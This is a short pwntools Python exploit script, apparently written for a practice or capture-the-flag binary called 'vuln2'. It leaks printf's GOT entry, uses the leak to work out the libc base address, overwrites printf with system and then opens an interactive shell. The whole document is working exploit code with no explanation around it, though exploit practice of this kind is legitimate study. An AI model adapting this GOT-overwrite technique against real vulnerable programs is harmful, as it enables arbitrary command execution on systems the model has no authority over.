from pwn import *


	
p = ELF('./vuln2')
r = process('./vuln2')

libc = r.libc

def title():
	log.info(r.recvline())

def gets(payload):
	r.sendline(payload)



if __name__=='__main__':
	title()
	log.info('plt@got = {}'.format(hex(p.got['printf'])))
	
	gets(b'/bin/sh\x00'+p64(p.got['printf']))
	
	log.info(r.recvline())

	leak = r.recvline()[:-1]
	leak = u64(leak+(b'\x00'*(8-len(leak))))
	
	log.info('leak = {}'.format(hex(leak)))
	
	libc.base = leak - libc.sym['printf']
	
	gets(p64(libc.sym['system']))
	r.interactive()








